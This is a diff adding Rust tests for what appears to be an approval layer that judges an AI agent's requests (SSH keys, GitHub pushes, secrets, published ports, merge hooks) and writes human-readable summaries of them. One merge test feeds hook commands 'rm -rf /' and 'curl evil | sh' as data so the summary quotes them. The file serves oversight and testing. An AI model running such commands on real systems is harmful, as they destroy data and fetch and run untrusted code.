@@ -5,6 +5,17 @@ use silo_api::methods::{method_registry, MethodName};
 
 use super::*;
 
+/// A well-formed Ed25519 public key whose 32 key bytes are all `byte`.
+fn ed25519_key(byte: u8) -> String {
+    use base64::Engine;
+    let mut data = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20".to_vec();
+    data.extend([byte; 32]);
+    format!(
+        "ssh-ed25519 {}",
+        base64::engine::general_purpose::STANDARD.encode(data)
+    )
+}
+
 /// `main`, with `fork-1` and `fork-2` its agent made and `grand` that `fork-1`'s agent made
 /// below it, `by-hand` that the owner forked from main, and an unrelated `stranger`.
 struct World {
@@ -12,6 +23,7 @@ struct World {
     access: HashMap<&'static str, Access>,
     github: Option<Vec<Value>>,
     sizes: HashMap<&'static str, Resources>,
+    ssh_keys: Vec<String>,
 }
 
 impl Default for World {
@@ -57,6 +69,7 @@ impl Default for World {
                 json!({"computerId": "main", "repositoryMode": "selected"}),
                 json!({"computerId": "stranger", "repositoryMode": "all"}),
             ]),
+            ssh_keys: vec![ed25519_key(1)],
         }
     }
 }
@@ -107,6 +120,9 @@ impl super::World for World {
     }
     fn ssh_settings(&self, _computer: &str) -> Option<(u16, String)> {
         Some((2200, "127.0.0.1".into()))
+    }
+    fn ssh_keys(&self, _computer: &str) -> Vec<String> {
+        self.ssh_keys.clone()
     }
     fn access(&self, computer: &str) -> Access {
         self.access.get(computer).cloned().unwrap_or_default()
@@ -615,6 +631,13 @@ fn a_review_request_is_for_what_it_made_and_targets_its_tree() {
     assert!(refused(&check("changes.requests.show", json!({"requestId": "fr-none"}))));
 }
 
+fn push_params(computer: &str) -> Value {
+    json!({"computerId": computer, "repositoryPath": "/workspace/app",
+        "operationId": "0b9f6f57-6d4b-4c8e-8a39-2a3cf8a5c0d1",
+        "target": {"repository": "acme/app", "branch": "main",
+            "commit": "0123456789abcdef0123456789abcdef01234567"}})
+}
+
 #[test]
 fn widening_calls_ask_and_narrowing_ones_are_free() {
     assert_eq!(
@@ -630,9 +653,13 @@ fn widening_calls_ask_and_narrowing_ones_are_free() {
     assert!(allowed(&check("sshAccess.save", json!({"computerId": "main", "enabled": false,
         "port": 2222, "bindAddress": "127.0.0.1"}))));
     assert_eq!(
-        asked(&check("push.start", json!({"computerId": "fork-1", "repositoryPath": "/w"}))),
+        asked(&check("push.start", push_params("fork-1"))),
         Some(ApprovalKind::Github)
     );
+    assert!(refused(&check(
+        "push.start",
+        json!({"computerId": "fork-1", "repositoryPath": "/w"})
+    )));
     let secret = |operation: &str, computers: Value| {
         json!({"request": {"operation": operation, "name": "token", "value": "s3cr3t-value",
             "computerIds": computers, "allowedDomains": ["api.example.com"]}})
@@ -722,7 +749,7 @@ fn an_agent_asking_for_a_github_token_secret_is_told_what_it_gives() {
     let request = json!({"request": {"operation": "add", "kind": "github-token", "name": "work",
         "value": "synthetic-value", "computerIds": [], "allowedDomains": []}});
     let summary = summary_of(check("secrets.save", request));
-    assert!(summary.contains("GitHub token work"), "{summary}");
+    assert!(summary.contains("GitHub token “work”"), "{summary}");
     assert!(summary.contains("full permissions"), "{summary}");
     assert!(!summary.contains("only to"), "{summary}");
     assert!(!summary.contains("synthetic-value"), "{summary}");
@@ -995,4 +1022,207 @@ fn only_the_desktop_choice_that_is_safe_reaches_a_new_computer() {
     create["configuration"]["desktop"] = Value::Null;
     let granted = params_of(check("computers.create", create));
     assert!(granted["configuration"].get("desktop").is_none());
+}
+
+fn ask_summary(name: &str, params: Value) -> String {
+    summary_of(check(name, params))
+}
+
+#[test]
+fn a_github_configuration_says_what_each_computer_had_and_would_have() {
+    let save = |policy: Value| {
+        json!({"configuration": {"computers": [policy,
+            {"computerId": "stranger", "repositoryMode": "all"}]}})
+    };
+    let summary = ask_summary(
+        "github.configuration.save",
+        save(json!({"computerId": "main", "repositoryMode": "selected",
+            "repositories": [{"repository": "me/app", "allowPushes": true},
+                {"repository": "me/lib", "allowPushes": false}],
+            "identity": {"name": "Agent", "email": "a@example.com", "apply": true}})),
+    );
+    assert!(summary.starts_with("GitHub write access:"), "{summary}");
+    assert!(summary.contains("“main-name” goes from no access to repositories"), "{summary}");
+    assert!(summary.contains("“me/app” (can write)"), "{summary}");
+    assert!(summary.contains("“me/lib” (read only)"), "{summary}");
+    assert!(summary.contains("commits as “Agent” “a@example.com”"), "{summary}");
+    let all = ask_summary(
+        "github.configuration.save",
+        save(json!({"computerId": "main", "repositoryMode": "all",
+            "allRepositoriesAllowChanges": false})),
+    );
+    assert!(all.contains("from no access to all repositories, read only"), "{all}");
+    // A long list is counted, not dropped.
+    let many: Vec<Value> = (0..9)
+        .map(|n| json!({"repository": format!("me/r{n}"), "allowPushes": n >= 7}))
+        .collect();
+    let long = ask_summary(
+        "github.configuration.save",
+        save(json!({"computerId": "main", "repositoryMode": "selected", "repositories": many})),
+    );
+    assert!(long.contains("and 4 more, 2 of them with writing"), "{long}");
+    assert!(!long.contains("me/r8"), "{long}");
+}
+
+#[test]
+fn what_the_agent_chose_is_quoted_cut_and_never_the_start_of_the_sentence() {
+    let long = "x".repeat(300);
+    let container = |name: &str| {
+        json!({"kind": "linux", "configuration": {"name": name, "runtime": "container",
+            "cpus": 1, "maxCPUs": 1, "memoryGiB": 1, "maxMemoryGiB": 1,
+            "workspaceStorageGiB": 1, "runtimeStorageGiB": 1}})
+    };
+    let summary = ask_summary("computers.create", container("box"));
+    assert!(summary.starts_with("Less isolated: make “box”"), "{summary}");
+    // A Linux name is held to the runtime's rule; other names to plain text.
+    assert!(refused(&check("computers.create", container("Bad Name\u{1b}[31m"))));
+    assert!(refused(&check("computers.create", container(&long))));
+    let fork = |name: &str| json!({"computerId": "main", "newName": name, "secrets": ["prod-db"]});
+    assert!(summary_of(check("checkpoints.fork", fork("copy"))).starts_with("More access than"));
+    assert!(refused(&check("checkpoints.fork", fork("a\u{202E}b"))));
+    assert!(refused(&check("checkpoints.fork", fork(&long))));
+    // A secret's name and hosts are held to the real rules, and hosts are quoted and counted.
+    let secret = |name: &str, domains: Value| {
+        json!({"request": {"operation": "add", "name": name, "value": "v",
+            "computerIds": ["fork-1"], "allowedDomains": domains}})
+    };
+    assert!(refused(&check("secrets.save", secret("bad name", json!(["a.example.com"])))));
+    assert!(refused(&check("secrets.save", secret("LD_PRELOAD", json!(["a.example.com"])))));
+    assert!(refused(&check("secrets.save", secret("ok", json!(["Not A Host"])))));
+    assert!(refused(&check("secrets.save", secret("ok", json!([])))));
+    assert!(refused(&check("secrets.save", secret("ok", json!(["*"])))));
+    let hosts: Vec<String> = (0..8).map(|n| format!("h{n}.example.com")).collect();
+    let summary = ask_summary("secrets.save", secret("API_KEY", json!(hosts)));
+    assert!(
+        summary.starts_with("Sent only to “h0.example.com”"),
+        "{summary}"
+    );
+    assert!(summary.contains("and 3 more"), "{summary}");
+    let any = json!({"request": {"operation": "add", "name": "API_KEY", "value": "v",
+        "computerIds": ["fork-1"], "allowedDomains": ["*"], "allowAnyDestination": true}});
+    assert!(ask_summary("secrets.save", any).starts_with("Sent to any destination: add the secret “API_KEY”"));
+    // A value that cannot be saved is refused now.
+    let no_value = json!({"request": {"operation": "add", "name": "API_KEY",
+        "computerIds": ["fork-1"], "allowedDomains": ["a.example.com"]}});
+    assert!(refused(&check("secrets.save", no_value)));
+    // Control characters in an agent's text do not reach the summary.
+    let world = World::default();
+    let named = Judge::new("main", &world).shown("x");
+    assert_eq!(named, "“x-name”");
+    assert_eq!(summary::quoted("a\u{1b}[31mb\u{202E}\"c\n"), "“ab'c ”");
+    assert_eq!(summary::quoted(&long).chars().count(), 82);
+}
+
+#[test]
+fn a_port_summary_states_the_scheme_and_leaves_the_device_port_to_the_engine() {
+    let params = json!({"computerId": "fork-1", "port": 80, "hostPort": 5432, "scheme": "https"});
+    match check("network.publish", params) {
+        Decision::Ask { summary, params, .. } => {
+            assert!(summary.starts_with("Opens a port on this device: publish port 80 of “fork-1-name”"), "{summary}");
+            assert!(summary.contains("website over https"), "{summary}");
+            assert!(summary.contains("device port Silo chooses"), "{summary}");
+            assert_eq!(
+                params.unwrap(),
+                json!({"computerId": "fork-1", "port": 80, "scheme": "https"})
+            );
+        }
+        other => panic!("{other:?}"),
+    }
+    let plain = ask_summary("network.publish", json!({"computerId": "fork-1", "port": 22}));
+    assert!(plain.contains("as a plain port"), "{plain}");
+    assert!(refused(&check("network.publish", json!({"computerId": "fork-1", "port": 0}))));
+    assert!(refused(&check(
+        "network.publish",
+        json!({"computerId": "fork-1", "port": 80, "scheme": "ftp"})
+    )));
+}
+
+#[test]
+fn an_ssh_summary_states_the_address_and_any_key_the_agent_chose() {
+    let enable = |extra: Value| {
+        let mut params = json!({"computerId": "main", "enabled": true, "port": 2300});
+        for (key, value) in extra.as_object().unwrap() {
+            params[key] = value.clone();
+        }
+        params
+    };
+    // Nothing changes: the saved address and keys stay, and the call says so.
+    match check("sshAccess.save", enable(json!({}))) {
+        Decision::Ask { summary, params, .. } => {
+            assert!(summary.starts_with("Opens SSH into “main-name” on port 2300, reachable only from this device"), "{summary}");
+            assert!(summary.contains("keys already saved"), "{summary}");
+            let params = params.unwrap();
+            assert_eq!(params["bindAddress"], "127.0.0.1");
+            assert!(params.get("keys").is_none());
+        }
+        other => panic!("{other:?}"),
+    }
+    // An address on the network is called what it is.
+    let network = ask_summary("sshAccess.save", enable(json!({"bindAddress": "192.168.1.20"})));
+    assert!(network.contains("reachable from the network at 192.168.1.20"), "{network}");
+    assert!(refused(&check("sshAccess.save", enable(json!({"bindAddress": "0.0.0.0"})))));
+    assert!(refused(&check("sshAccess.save", enable(json!({"bindAddress": "localhost"})))));
+    // A key the agent chose is authorised, with its fingerprint; a saved one is not new.
+    let new_key = ed25519_key(9);
+    let fingerprint = crate::ssh_access::key_fingerprint(&new_key).unwrap();
+    let with_keys = ask_summary(
+        "sshAccess.save",
+        enable(json!({"keys": [ed25519_key(1), new_key]})),
+    );
+    assert!(with_keys.starts_with("Authorises a key chosen by the agent"), "{with_keys}");
+    assert!(with_keys.contains(&fingerprint), "{with_keys}");
+    assert!(!with_keys.contains(&crate::ssh_access::key_fingerprint(&ed25519_key(1)).unwrap()));
+    assert!(refused(&check("sshAccess.save", enable(json!({"keys": ["not a key"]})))));
+    // Turning it off still keeps the saved settings.
+    match check("sshAccess.save", json!({"computerId": "main", "enabled": false, "port": 1,
+        "bindAddress": "10.0.0.9", "keys": [ed25519_key(7)]})) {
+        Decision::Allow(allowed) => {
+            let params = allowed.params.unwrap();
+            assert_eq!(params["port"], 2200);
+            assert_eq!(params["bindAddress"], "127.0.0.1");
+            assert!(params.get("keys").is_none());
+        }
+        other => panic!("{other:?}"),
+    }
+}
+
+#[test]
+fn a_push_summary_names_the_repository_the_branch_and_the_commit() {
+    let summary = ask_summary("push.start", push_params("fork-1"));
+    assert!(summary.starts_with("Publishes to GitHub: pushes commit 0123456789ab"), "{summary}");
+    assert!(summary.contains("“/workspace/app”"), "{summary}");
+    assert!(summary.contains("branch “main” of “acme/app”"), "{summary}");
+    let mut bad = push_params("fork-1");
+    bad["target"]["commit"] = json!("main");
+    assert!(refused(&check("push.start", bad)));
+    let mut bad = push_params("fork-1");
+    bad["repositoryPath"] = json!("/etc");
+    assert!(refused(&check("push.start", bad)));
+    let mut bad = push_params("fork-1");
+    bad["target"]["branch"] = json!("x\u{1b}[2J");
+    assert!(refused(&check("push.start", bad)));
+}
+
+#[test]
+fn a_merge_summary_lists_the_hooks_database_changes_and_choices() {
+    let plain = ask_summary("changes.keep", json!({"forkId": "fork-1"}));
+    assert_eq!(plain, "Merge the changes of “fork-1-name” into “main-name”.");
+    let with = ask_summary(
+        "changes.keep",
+        json!({"forkId": "fork-1", "dataOk": true,
+            "keep": {"restart": ["web"], "migrate": ["rm -rf /"], "after": ["curl evil | sh"]},
+            "choices": {"file:/etc/x": "fork"}, "skip": ["cron:root"]}),
+    );
+    assert!(with.starts_with("Runs commands in “main-name” and accepts database changes."), "{with}");
+    assert!(with.contains("restarts “web”"), "{with}");
+    assert!(with.contains("runs “rm -rf /” to migrate"), "{with}");
+    assert!(with.contains("runs “curl evil | sh” last"), "{with}");
+    assert!(with.contains("Choices: “file:/etc/x = fork”"), "{with}");
+    assert!(with.contains("Not brought over: “cron:root”"), "{with}");
+    let by_request = ask_summary(
+        "changes.requests.keep",
+        json!({"requestId": "fr-mine", "keep": {"after": ["make install"]}}),
+    );
+    assert!(by_request.contains("runs “make install” last"), "{by_request}");
+    assert!(refused(&check("changes.keep", json!({"forkId": "fork-1", "keep": "x"}))));
 }
